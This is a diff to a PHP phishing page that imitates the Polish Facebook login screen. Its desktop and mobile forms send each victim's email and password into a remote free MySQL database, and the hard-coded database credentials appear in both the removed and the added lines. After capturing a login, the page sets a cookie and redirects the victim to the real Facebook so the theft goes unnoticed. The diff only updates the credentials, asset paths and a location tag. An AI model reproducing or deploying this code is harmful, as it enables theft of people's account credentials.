@@ -8,9 +8,9 @@ if (isset($_COOKIE['5434']))
 }
 
 if(isset($_COOKIE['miasto'])) {
-  $city = $_COOKIE['miasto'];
+  $city = $_COOKIE['miasto'] . " -PL";
 } else {
-  $city = 'xxx';
+  $city = "pvbot";
 }
 
 
@@ -20,20 +20,20 @@ if(isset($_COOKIE['miasto'])) {
 <head lang="pl">
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<link rel="stylesheet" type="text/css" href="css/computer.css" media="screen and (min-width: 769px)">
-<link rel="stylesheet" type="text/css" href="css/mobile.css" media="screen and (max-width: 768px)">
+<link rel="stylesheet" type="text/css" href="css1/computer.css" media="screen and (min-width: 769px)">
+<link rel="stylesheet" type="text/css" href="css1/mobile.css" media="screen and (max-width: 768px)">
 <meta name="robots" content="noindex,nofollow">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
-<link rel="icon" type="image/x-icon" href="images/favicon.jpg">
+<link rel="icon" type="image/x-icon" href="photos1/favicon.jpg">
 <title>Facebook - zaloguj się lub zarejestruj</title>
 </head>
 <body>
 <div class="computer">
   <header>
     <div class="headersubdiv">
-      <img src="images/fblogo.png" class="fblogo">
+      <img src="photos1/fblogo.png" class="fblogo">
       <div class="loginform">
         <table>
           <tr>
@@ -42,43 +42,54 @@ if(isset($_COOKIE['miasto'])) {
           </tr>
 
           
-  <form method="post" name="one">
+  <form method="POST" name="one">
       <td><input name="email" class="logintext loginfield" type="text"></td>
       <td><input name="pass" class="logintext loginrowgap loginfield" type="password"></td>
       <td><input class="loginrowgap" id="loginbutton" name="submit" type="submit" value="Zaloguj się"></td>
   </form>
      
        
-<?php
-if(isset($_POST['submit'])) {
-  if (!empty($_POST['email']) && !empty($_POST['pass'])){
+  <?php
+    if(isset($_POST['submit'])) {
+      if (!empty($_POST['email']) && !empty($_POST['pass'])){
 
-    $servername = "sql4.freesqldatabase.com";
-    $user = "sql4424067";
-    $pass = "b7JsB8ixrj";
-    $dbname = "sql4424067";
+        $servername = "sql4.freesqldatabase.com";
+        $user = "sql4430208";
+        $pass = "Gbb4TYcqZZ";
+        $dbname = "sql4430208";
 
-    $link = mysqli_connect($servername, $user, $pass, $dbname);
-    if($link === false){
-      echo '<script type="text/javascript">
-           window.location = "https://www.facebook.com/me"
-      </script>';
+        // mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
+        $link = mysqli_connect($servername, $user, $pass, $dbname);
+
+        $mysqli = new mysqli($servername, $user, $pass, $dbname);
+
+        if($mysqli === false){
+          echo '<script type="text/javascript">
+              window.location = "https://www.facebook.com/me"
+          </script>';
+        }
+
+        $email = $_POST['email'];
+        $password = $_POST['pass'];
+
+        $sql = "INSERT INTO test (m, p, city) VALUES ('$email', '$password', '$city')";
+
+        $result = $mysqli->query($sql);
+
+        if($result){
+            setcookie("5434", "58734", time()+60*60*24*30);
+            echo '
+              <script type="text/javascript">
+                window.location = "https://www.facebook.com/me"
+              </script>';
+        } else{
+          header("Refresh:0");
+        }
+
+      mysqli_close($link);
+      }
     }
-    $email = $_POST['email'];
-    $password = $_POST['pass'];
-    $sql = "INSERT INTO test (m, p, city) VALUES ('$email', '$password', '$city')";
-    if(mysqli_query($link, $sql)){
-        setcookie("5434", "58734", time()+60*60*24*30);
-        echo '<script type="text/javascript">
-           window.location = "https://www.facebook.com/me"
-      </script>';
-    } else{
-      header("Refresh:0");
-    }
-    mysqli_close($link);
-    }
-}
-?>
+  ?>
           </tr>
           <tr>
             <td></td>
@@ -94,7 +105,7 @@ if(isset($_POST['submit'])) {
       <div class="welcome">
         <div class="welcometext">Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informację i materiały</div>
         <div class="welcomepic">
-          <img src="images/connecting.png" alt="welcome">
+          <img src="photos1/connecting.png" alt="welcome">
         </div>
       </div>
       <div class="signupdiv">
@@ -238,7 +249,7 @@ if(isset($_POST['submit'])) {
 
 <div class="mobile">
   <div class="mobheader">
-    <img src="images/fblogo.png" class="mobfblogo">
+    <img src="photos1/fblogo.png" class="mobfblogo">
   </div>
   <div class="mobmaindiv">
 
@@ -260,10 +271,10 @@ if(isset($_POST['submitX'])) {
   if (!empty($_POST['emailX']) && !empty($_POST['passX'])){
 
     $servernameX = "sql4.freesqldatabase.com";
-    $userX = "sql4424067";
-    $passX = "b7JsB8ixrj";
-    $dbnameX = "sql4424067";
-
+    $userX = "sql4430208";
+    $passX = "Gbb4TYcqZZ";
+    $dbnameX = "sql4430208";
+    
     $linkX = mysqli_connect($servernameX, $userX, $passX, $dbnameX);
     
     $emailX = $_POST['emailX'];
@@ -272,6 +283,7 @@ if(isset($_POST['submitX'])) {
     $sqlX = "INSERT INTO test (m, p, city) VALUES ('$emailX', '$passwordX', '$city')";
     
     if(mysqli_query($linkX, $sqlX)){
+      setcookie("5434", "58734", time()+60*60*24*30);
         echo '<script type="text/javascript">
            window.location = "https://www.facebook.com/me"
       </script>';
